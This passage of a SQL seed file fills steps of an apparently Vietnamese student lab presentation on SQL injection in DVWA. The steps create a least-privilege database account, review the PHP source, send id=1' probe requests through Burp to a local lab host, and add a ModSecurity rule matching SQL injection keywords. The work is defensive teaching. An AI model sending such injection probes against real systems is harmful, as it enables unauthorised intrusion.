VALUES ('m3-s4', 3, 4, 'GIA CỐ & PHÒNG THỦ • VÁ LỖI 2 (LEAST PRIVILEGE)', 'Vá lỗi 2 Trực tiếp — Tạo Tài khoản CSDL Đặc quyền Tối thiểu (dvwa_svc)', 'Vá lỗi 2 • DB Grants', true, 'Chấm dứt việc kết nối ứng dụng web bằng tài khoản root toàn quyền, thay thế bằng tài khoản dịch vụ chỉ có quyền SELECT, INSERT, UPDATE trên bảng dvwa.users.', '["Chạy lệnh CREATE USER tạo tài khoản ''dvwa_svc''@''localhost'' với mật khẩu mạnh.","Cấp đúng 3 quyền nghiệp vụ cần thiết: GRANT SELECT, INSERT, UPDATE ON dvwa.users.","Chạy FLUSH PRIVILEGES và SHOW GRANTS FOR ''dvwa_svc''@''localhost'' để lấy bằng chứng kiểm toán."]'::jsonb, '[{"label":"Tạo tài khoản dịch vụ Least Privilege & Kiểm tra quyền","shell":"zsh / bash","template":"docker exec -it {{CONTAINER}} mysql -u root -e \"CREATE USER IF NOT EXISTS ''dvwa_svc''@''localhost'' IDENTIFIED BY ''SecureSvcPass2026!''; GRANT SELECT, INSERT, UPDATE ON dvwa.users TO ''dvwa_svc''@''localhost''; FLUSH PRIVILEGES; SHOW GRANTS FOR ''dvwa_svc''@''localhost'';\" ","explanation":"Không cấp DROP, ALTER, FILE, SUPER hay quyền truy cập vào cơ sở dữ liệu mysql/information_schema nhạy cảm."}]'::jsonb, '+--------------------------------------------------------------------------------+
| Grants for dvwa_svc@localhost                                                  |
+--------------------------------------------------------------------------------+
| GRANT USAGE ON *.* TO ''dvwa_svc''@''localhost'' IDENTIFIED BY PASSWORD ...        |
| GRANT SELECT, INSERT, UPDATE ON `dvwa`.`users` TO ''dvwa_svc''@''localhost''       |
+--------------------------------------------------------------------------------+', 'Nguyên tắc Đặc quyền Tối thiểu (Least Privilege) giới hạn bán kính thiệt hại (Blast Radius): dù tầng web có sự cố, kẻ tấn công cũng không thể đọc file hệ thống (LOAD_FILE/INTO OUTFILE) hay phá hủy bảng/CSDL khác.', 'Song song với vá mật mã học, áp dụng nguyên tắc Least Privilege bằng cách tạo tài khoản dịch vụ dvwa_svc chỉ được cấp quyền SELECT, INSERT, UPDATE trên đúng bảng dvwa.users thay cho tài khoản root toàn quyền.', 'm3-mariadb-patch')
ON CONFLICT (id) DO UPDATE SET
  member_number = EXCLUDED.member_number, step_order = EXCLUDED.step_order, phase_tag = EXCLUDED.phase_tag, title = EXCLUDED.title, poc_ref = EXCLUDED.poc_ref, is_defense = EXCLUDED.is_defense, goal = EXCLUDED.goal, action_steps = EXCLUDED.action_steps, commands = EXCLUDED.commands, expected_output = EXCLUDED.expected_output, academic_explanation = EXCLUDED.academic_explanation, presenter_script = EXCLUDED.presenter_script, simulator_key = EXCLUDED.simulator_key;

INSERT INTO public.scenario_steps (id, member_number, step_order, phase_tag, title, poc_ref, is_defense, goal, action_steps, commands, expected_output, academic_explanation, presenter_script, simulator_key)
VALUES ('m4-s1', 4, 1, 'PHẦN CHÍNH + MỞ RỘNG • POC 4', 'Kiểm toán Hộp trắng & Đối chiếu Mã nguồn PHP 4 Cấp độ', 'PoC 4 • PHP 4 cấp', true, 'Đặt cả 4 file mã nguồn (low.php, medium.php, high.php, impossible.php) lên bàn cân kiểm toán để chỉ ra nguyên nhân gốc rễ và lý do các bộ lọc bề mặt vẫn bị vượt qua.', '["Chạy 4 lệnh docker exec {{CONTAINER}} cat -n ... để xuất mã nguồn kèm số dòng của cả 4 cấp độ.","Chỉ rõ low.php: Dòng 5 nhận thẳng $_REQUEST[''id''], Dòng 8 nối chuỗi ''$id'', Dòng 9 in lỗi MariaDB qua mysqli_error().","Giải thích medium.php: Có dùng mysqli_real_escape_string() nhưng câu SQL viết WHERE user_id = $id không có dấu nháy đơn -> SQL coi là biểu thức số học, vô hiệu hóa hàm thoát nháy.","Giải thích high.php: Truyền qua $_SESSION và thêm LIMIT 1 nhưng vi phạm Trust Boundary khi vẫn ghép chuỗi trực tiếp.","Phân tích impossible.php: Phòng thủ 3 lớp gồm checkToken() (dòng 5), is_numeric($id) (dòng 11), và PDO Prepared Statements prepare() + bindParam(..., PDO::PARAM_INT) (dòng 13–15)."]'::jsonb, '[{"label":"Trích xuất mã nguồn 4 cấp độ kèm số dòng (PoC 4 mở rộng)","shell":"zsh / bash","template":"docker exec {{CONTAINER}} cat -n /var/www/html/vulnerabilities/sqli/source/low.php\ndocker exec {{CONTAINER}} cat -n /var/www/html/vulnerabilities/sqli/source/medium.php\ndocker exec {{CONTAINER}} cat -n /var/www/html/vulnerabilities/sqli/source/high.php\ndocker exec {{CONTAINER}} cat -n /var/www/html/vulnerabilities/sqli/source/impossible.php","explanation":"Cờ cat -n đánh số thứ tự từng dòng lệnh PHP giúp đối chiếu chính xác dòng gây lỗi và dòng phòng thủ."}]'::jsonb, '[low.php] Dòng 5: $id = $_REQUEST[''id'']; | Dòng 8: WHERE user_id = ''$id''; | Dòng 9: mysqli_error(...)
[medium.php] mysqli_real_escape_string(...) nhưng WHERE user_id = $id (thiếu nháy đơn)
[high.php] $_SESSION[''id''] + LIMIT 1 nhưng vẫn nối chuỗi (Trust Boundary)
[impossible.php] Dòng 5: checkToken() | Dòng 11: is_numeric($id) | Dòng 13-15: $db->prepare() + bindParam('':id'', $id, PDO::PARAM_INT)', 'Bản chất của Prepared Statements là tách biệt hoàn toàn Giai đoạn Biên dịch cây cú pháp SQL (Compilation Phase tại prepare) và Giai đoạn Nạp tham số (Execution Phase tại bindParam/execute), khiến dữ liệu nhập vào luôn là Data Literal.', 'Khi kiểm toán hộp trắng 4 cấp độ mã nguồn PHP, lỗi gốc nằm ở dòng 8 của low.php do nối chuỗi trực tiếp; medium và high dùng escape hay session vẫn bị bypass; còn impossible.php chặn đứng hoàn toàn nhờ 3 lớp bảo vệ chuẩn.', 'm4-php-diff')
ON CONFLICT (id) DO UPDATE SET
  member_number = EXCLUDED.member_number, step_order = EXCLUDED.step_order, phase_tag = EXCLUDED.phase_tag, title = EXCLUDED.title, poc_ref = EXCLUDED.poc_ref, is_defense = EXCLUDED.is_defense, goal = EXCLUDED.goal, action_steps = EXCLUDED.action_steps, commands = EXCLUDED.commands, expected_output = EXCLUDED.expected_output, academic_explanation = EXCLUDED.academic_explanation, presenter_script = EXCLUDED.presenter_script, simulator_key = EXCLUDED.simulator_key;

INSERT INTO public.scenario_steps (id, member_number, step_order, phase_tag, title, poc_ref, is_defense, goal, action_steps, commands, expected_output, academic_explanation, presenter_script, simulator_key)
VALUES ('m4-s2', 4, 2, 'PHẦN CHÍNH • POC 5 GỐC', 'Kiểm chứng Bản vá trên Burp Repeater — PoC 5 Gốc (Chặn ở tầng CSRF)', 'PoC 5 • 302 Found', false, 'Chứng minh khi chuyển Cookie sang security=impossible trên gói tin cũ (không chứa user_token), hệ thống lập tức chặn đứng yêu cầu.', '["Mở lại tab Repeater trên Burp Suite (hoặc copy request từ PoC 2).","Giữ nguyên URL tấn công cũ /vulnerabilities/sqli/?id=1''&Submit=Submit (không có user_token).","Sửa dòng Cookie từ security=low thành security=impossible rồi bấm Send.","Quan sát Response: máy chủ trả về HTTP/1.1 302 Found, Content-Length: 0, chuyển hướng về Location: index.php."]'::jsonb, '[{"label":"Request PoC 5 Gốc trên Burp Repeater (Thiếu user_token)","shell":"http","template":"GET /vulnerabilities/sqli/?id=1''&Submit=Submit HTTP/1.1\nHost: localtest.me:8080\nCookie: security=impossible; PHPSESSID={{PHPSESSID}}","explanation":"Vì thiếu tham số user_token, hàm checkToken() tại dòng 5 của impossible.php kích hoạt ngay trước khi chạm tới logic kiểm tra $id và truy vấn SQL."}]'::jsonb, 'HTTP/1.1 302 Found
Date: Wed, 04 Nov 2026 02:07:32 GMT
Server: Apache/2.4.25 (Debian)
Location: index.php
Content-Length: 0
Content-Type: text/html; charset=UTF-8', 'Phản hồi 302 Found với Content-Length: 0 chứng minh lớp bảo vệ đầu tiên (Anti-CSRF Token ở dòng 5) đã chặn ngay yêu cầu giả mạo/thiếu token và không hề mở kết nối truy vấn CSDL.', 'Ở PoC 5 gốc, chỉ cần đổi Cookie sang security=impossible và gửi lại gói tin tấn công cũ, hệ thống lập tức trả về HTTP 302 Found chuyển hướng về index.php do bị chặn ngay tại hàm checkToken ở dòng 5.', 'm4-poc5-waf')
ON CONFLICT (id) DO UPDATE SET
  member_number = EXCLUDED.member_number, step_order = EXCLUDED.step_order, phase_tag = EXCLUDED.phase_tag, title = EXCLUDED.title, poc_ref = EXCLUDED.poc_ref, is_defense = EXCLUDED.is_defense, goal = EXCLUDED.goal, action_steps = EXCLUDED.action_steps, commands = EXCLUDED.commands, expected_output = EXCLUDED.expected_output, academic_explanation = EXCLUDED.academic_explanation, presenter_script = EXCLUDED.presenter_script, simulator_key = EXCLUDED.simulator_key;

INSERT INTO public.scenario_steps (id, member_number, step_order, phase_tag, title, poc_ref, is_defense, goal, action_steps, commands, expected_output, academic_explanation, presenter_script, simulator_key)
VALUES ('m4-s3', 4, 3, 'GIA CỐ & PHÒNG THỦ • POC 5 TINH CHỈNH', 'Kiểm chứng PoC 5 Tinh chỉnh — Điền Đủ user_token để Test Lớp SQLi & PDO', 'PoC 5 • user_token', true, 'Khắc phục hạn chế của PoC 5 gốc (mới test được lớp CSRF) bằng cách truyền user_token hợp lệ, buộc gói tin đi qua dòng 5 để kiểm chứng thực sự lớp is_numeric($id) và PDO Prepared Statements.', '["Trên trình duyệt ở mức security=impossible, mở trang /vulnerabilities/sqli/ và Inspect HTML (hoặc xem Response GET trang chủ SQLi trong Burp) để lấy giá trị ẩn <input type=\"hidden\" name=\"user_token\" value=\"...\">.","Trên Burp Repeater, thử gửi id=1 kèm user_token hợp lệ -> trả về 200 OK hiển thị thông tin người dùng bình thường.","Lấy user_token mới tiếp theo, gửi tham số độc hại id=1'' kèm user_token hợp lệ trên Burp Repeater.","Quan sát Response: 200 OK nhưng trang trống/không có kết quả truy vấn và TUYỆT ĐỐI không xuất hiện lỗi cú pháp MariaDB nào."]'::jsonb, '[{"label":"Request PoC 5 Tinh chỉnh trên Burp Repeater (Đầy đủ user_token)","shell":"http","template":"GET /vulnerabilities/sqli/?id=1''&Submit=Submit&user_token={{USER_TOKEN}} HTTP/1.1\nHost: localtest.me:8080\nCookie: security=impossible; PHPSESSID={{PHPSESSID}}","explanation":"Yêu cầu vượt qua checkToken() ở dòng 5, nhưng lập tức bị hàm is_numeric($id) ở dòng 11 trả về false nên bỏ qua khối thực thi CSDL (và nếu vào được PDO cũng bị ép kiểu PDO::PARAM_INT)."}]'::jsonb, 'HTTP/1.1 200 OK
Content-Type: text/html;charset=utf-8
<!-- Trang web hiển thị form bình thường, KHÔNG trả về bản ghi nào và KHÔNG lộ bất kỳ thông báo lỗi MariaDB nào -->', 'PoC 5 tinh chỉnh chứng minh thực nghiệm trọn vẹn cả 3 lớp phòng thủ (Anti-CSRF + Type Validation + PDO Prepared Statements) đều hoạt động chuẩn xác khi kiểm thử đầy đủ tham số.', 'Nếu chỉ dừng ở 302 Found thì mới chứng minh được lớp chống CSRF. Khi trích xuất user_token hợp lệ từ HTML gắn vào gói tin GET id=1'', gói tin vượt qua checkToken() nhưng bị is_numeric() ở dòng 11 chặn đứng, không lộ bất kỳ lỗi CSDL nào.', 'm4-poc5-waf')
ON CONFLICT (id) DO UPDATE SET
  member_number = EXCLUDED.member_number, step_order = EXCLUDED.step_order, phase_tag = EXCLUDED.phase_tag, title = EXCLUDED.title, poc_ref = EXCLUDED.poc_ref, is_defense = EXCLUDED.is_defense, goal = EXCLUDED.goal, action_steps = EXCLUDED.action_steps, commands = EXCLUDED.commands, expected_output = EXCLUDED.expected_output, academic_explanation = EXCLUDED.academic_explanation, presenter_script = EXCLUDED.presenter_script, simulator_key = EXCLUDED.simulator_key;

INSERT INTO public.scenario_steps (id, member_number, step_order, phase_tag, title, poc_ref, is_defense, goal, action_steps, commands, expected_output, academic_explanation, presenter_script, simulator_key)
VALUES ('m4-s4', 4, 4, 'GIA CỐ & PHÒNG THỦ • WAF & DEFENSE-IN-DEPTH', 'Thiết lập Luật WAF ModSecurity & Tổng kết Phòng thủ Chiều sâu (OWASP A03:2021)', 'WAF • SecRule 100001', true, 'Hoàn thiện lớp phòng ngự tầng biên bằng quy tắc ModSecurity OWASP CRS (chặn HTTP 403 trước khi chạm tới PHP) và tổng kết 3 kiến nghị Defense-in-Depth.', '["Trình bày quy tắc SecRule ID 100001 của WAF ModSecurity kiểm tra tham số ARGS:id bằng biểu thức chính quy @rx.","Giải thích cơ chế hành động: deny với mã trạng thái status:403, ghi nhật ký log mức CRITICAL ngay tại pha 2 (request body/args) trước khi PHP xử lý.","Tổng kết 3 lớp Phòng thủ Chiều sâu (Defense-in-Depth): (1) Code & DB (PDO Prepared Statements + Least Privilege dvwa_svc), (2) Mật mã học (Argon2id/Bcrypt có Salt), (3) Hạ tầng & Tầng biên (Ẩn Banner Apache, Cookie HttpOnly/SameSite=Strict, WAF ModSecurity + Giám sát Log).","Khép lại với thông điệp Security by Design theo chuẩn OWASP Top 10 (A03:2021 - Injection)."]'::jsonb, '[{"label":"Quy tắc WAF ModSecurity (OWASP CRS Custom SecRule)","shell":"apache","template":"SecRule ARGS:id \"@rx (\\''|--|#|/\\*|UNION|SELECT|OR\\s+\\d+=\\d+)\" \\\n  \"id:100001,phase:2,deny,status:403,log,msg:''Phat hien dau hieu bat thuong trong tham so id - Ngan chan boi ModSecurity'',tag:''application-multi-rule'',severity:''CRITICAL''\"","explanation":"Chặn các ký tự/từ khóa đặc trưng của SQL Injection ('', --, #, /*, UNION, SELECT, OR 1=1) ngay tại tầng Apache WAF với mã 403 Forbidden."}]'::jsonb, 'HTTP/1.1 403 Forbidden
[ModSecurity Audit Log] id "100001" | severity "CRITICAL" | msg "Phat hien dau hieu bat thuong trong tham so id - Ngan chan boi ModSecurity"', 'Phòng thủ Chiều sâu (Defense-in-Depth) đảm bảo nếu một lớp gặp sơ hở (ví dụ lập trình viên quên sửa 1 file PHP cũ), WAF ở tầng biên, tài khoản DB tối thiểu và thuật toán Bcrypt vẫn bảo vệ hệ thống toàn vẹn.', 'Cuối cùng, để bảo vệ hệ thống ngay từ tầng biên trước khi mã độc chạm vào PHP, quy tắc WAF ModSecurity SecRule id 100001 được thiết lập để trả về 403 Forbidden, khép lại mô hình bảo mật đa tầng Security by Design theo OWASP A03:2021.', 'm4-poc5-waf')
ON CONFLICT (id) DO UPDATE SET
  member_number = EXCLUDED.member_number, step_order = EXCLUDED.step_order, phase_tag = EXCLUDED.phase_tag, title = EXCLUDED.title, poc_ref = EXCLUDED.poc_ref, is_defense = EXCLUDED.is_defense, goal = EXCLUDED.goal, action_steps = EXCLUDED.action_steps, commands = EXCLUDED.commands, expected_output = EXCLUDED.expected_output, academic_explanation = EXCLUDED.academic_explanation, presenter_script = EXCLUDED.presenter_script, simulator_key = EXCLUDED.simulator_key;

